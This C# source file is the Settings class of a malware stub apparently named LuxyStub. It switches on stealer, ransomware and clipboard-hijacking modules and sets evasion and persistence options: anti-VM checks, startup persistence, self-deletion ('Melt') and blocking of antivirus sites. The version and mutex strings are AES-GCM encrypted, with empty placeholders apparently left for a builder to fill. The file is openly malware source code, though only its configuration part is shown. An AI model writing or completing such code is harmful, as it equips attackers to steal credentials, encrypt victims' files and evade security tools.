using LuxyStub.Components.Algorithms;
using System;
using System.Linq;
using System.Text;

namespace LuxyStub
{
    internal static class Settings
    {
        internal static bool StealerModule { get; set; }
        internal static bool RansomewareModule { get; set; }
        internal static bool ClippperModule { get; set; }
        internal static string Version { set; get; }
        internal static string Mutex { set; get; }

        internal static bool Startup { get; set; }
        internal static bool AntiVm { get; set; }
        internal static bool Melt { get; set; }
        internal static bool BlockAvSites { get; set; }

        static Settings()
        {
            var key = "";
            var iv = "";

            var encryptedVersion = "";
            var encryptedMutex = "";

            var stealerModule = true;
            var ransomewareModule = false;
            var clipperModule = false;

            var startup = true;
            var antiVm = true;
            var melt = true;
            var blockAvSites = false;

            // ---------------- Initialise variables ----------------

            var conv_key = Convert.FromBase64String(key);
            var conv_iv = Convert.FromBase64String(iv);

            Version = Decrypt(Convert.FromBase64String(encryptedVersion), conv_key, conv_iv);
            Mutex = Decrypt(Convert.FromBase64String(encryptedMutex), conv_key, conv_iv);

            StealerModule = stealerModule;
            RansomewareModule = ransomewareModule;
            ClippperModule = clipperModule;

            Startup = startup;
            AntiVm = antiVm;
            Melt = melt;
            BlockAvSites = blockAvSites;
        }

        static string Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
        {
            var cipherText = encryptedData.Take(encryptedData.Length - 16).ToArray();
            var tag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

            var aesgcm = new AesGcm();
            var decrypted = aesgcm.Decrypt(key, iv, null, cipherText, tag);

            return Encoding.UTF8.GetString(decrypted);
        }
    }
}
